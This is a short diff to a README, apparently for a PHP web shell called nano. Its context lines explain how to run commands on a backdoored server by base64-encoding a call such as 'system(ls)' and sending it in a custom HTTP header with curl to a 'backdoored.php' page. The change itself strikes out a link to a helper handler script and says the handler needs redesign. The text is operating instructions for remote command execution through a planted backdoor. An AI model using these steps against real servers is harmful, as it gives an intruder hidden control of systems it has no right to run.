@@ -63,7 +63,8 @@ This one a bit complex.\
 Lets say you want to run `system(ls)` so write it as `system~ls` and then base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
 Now open your terminal and type the following command\
 `curl -H 'x: c3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
-Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.
+~~Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.~~
+The handler needs some redesigning which is not that important right now. 
 
 ![handler](https://i.imgur.com/hkAHGwH.png)
 
